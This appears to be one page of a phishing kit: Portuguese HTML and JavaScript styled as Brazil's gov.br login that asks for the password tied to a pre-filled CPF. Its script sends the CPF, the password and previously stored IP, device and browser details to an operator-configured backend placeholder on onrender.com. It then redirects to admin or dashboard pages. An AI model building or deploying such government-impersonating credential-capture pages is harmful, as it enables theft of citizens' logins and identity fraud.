<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>gov.br - Digite sua senha</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a5f7a 0%, #0d3550 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: white;
            border-radius: 8px;
            width: 100%;
            max-width: 450px;
            padding: 40px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
        }
        .header { text-align: center; margin-bottom: 30px; }
        .header h1 { color: #1a5f7a; font-size: 24px; margin-bottom: 8px; }
        .cpf-display {
            background: #f5f5f5;
            padding: 12px;
            border-radius: 4px;
            text-align: center;
            font-size: 18px;
            font-weight: bold;
            margin-bottom: 20px;
        }
        .input-group { margin-bottom: 20px; }
        .input-group label { display: block; margin-bottom: 8px; color: #333; font-weight: 500; }
        .input-group input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 16px;
        }
        .btn-login {
            width: 100%;
            padding: 12px;
            background: #1a5f7a;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }
        .btn-login:hover { background: #0d4b63; }
        .btn-voltar {
            width: 100%;
            padding: 12px;
            background: #f0f0f0;
            color: #333;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }
        .message {
            margin-top: 20px;
            padding: 10px;
            border-radius: 4px;
            text-align: center;
            display: none;
        }
        .message.error { background: #fee; color: #c33; display: block; }
        .message.success { background: #efe; color: #3c3; display: block; }
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid #fff;
            border-radius: 50%;
            border-top-color: transparent;
            animation: spin 0.6s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        button:disabled { opacity: 0.6; cursor: not-allowed; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>gov.br</h1>
            <p>Digite sua senha</p>
        </div>
        
        <div class="cpf-display" id="cpfDisplay">Carregando...</div>
        
        <div class="input-group">
            <label>Senha</label>
            <input type="password" id="password" placeholder="Digite sua senha">
        </div>
        
        <button class="btn-login" id="loginBtn" onclick="fazerLogin()">Entrar</button>
        <button class="btn-voltar" onclick="voltar()">Voltar</button>
        
        <div id="message" class="message"></div>
    </div>

    <script>
        // ============================================================
        // CONFIGURAÇÃO - ALTERAR PARA URL DO SEU BACKEND
        // ============================================================
        const API_URL = 'https://seu-backend.onrender.com/api';

        // Recuperar dados salvos
        const cpf = localStorage.getItem('login_cpf');
        const ip = localStorage.getItem('login_ip');
        const dispositivo = localStorage.getItem('login_dispositivo');
        const navegador = localStorage.getItem('login_navegador');

        // Exibir CPF formatado
        function formatarCPF(cpf) {
            if (!cpf) return '---';
            return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
        }

        document.getElementById('cpfDisplay').textContent = formatarCPF(cpf);

        // Se não tiver CPF, voltar
        if (!cpf) {
            window.location.href = 'index.html';
        }

        function showMessage(msg, type) {
            const msgDiv = document.getElementById('message');
            msgDiv.textContent = msg;
            msgDiv.className = `message ${type}`;
            setTimeout(() => msgDiv.style.display = 'none', 4000);
        }

        async function fazerLogin() {
            const password = document.getElementById('password').value;
            const loginBtn = document.getElementById('loginBtn');
            
            if (!password) {
                showMessage('Digite sua senha', 'error');
                return;
            }
            
            loginBtn.disabled = true;
            loginBtn.innerHTML = '<span class="loading"></span> Entrando...';
            
            try {
                const response = await fetch(`${API_URL}/login`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        cpf: cpf,
                        password: password,
                        ip: ip,
                        dispositivo: dispositivo,
                        navegador: navegador
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    showMessage('Login realizado! Redirecionando...', 'success');
                    localStorage.setItem('token', data.token);
                    localStorage.setItem('user', JSON.stringify(data.user));
                    
                    // Limpar dados temporários
                    localStorage.removeItem('login_cpf');
                    localStorage.removeItem('login_ip');
                    localStorage.removeItem('login_dispositivo');
                    localStorage.removeItem('login_navegador');
                    
                    setTimeout(() => {
                        if (data.user.role === 'admin') {
                            window.location.href = 'admin.html';
                        } else {
                            window.location.href = 'dashboard.html';
                        }
                    }, 1500);
                } else {
                    showMessage(data.error || 'CPF ou senha inválidos', 'error');
                    loginBtn.disabled = false;
                    loginBtn.innerHTML = 'Entrar';
                }
            } catch (error) {
                showMessage('Erro ao conectar com o servidor', 'error');
                loginBtn.disabled = false;
                loginBtn.innerHTML = 'Entrar';
            }
        }

        document.getElementById('password').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') fazerLogin();
        });

        function voltar() {
            window.location.href = 'index.html';
        }
    </script>
</body>
</html>
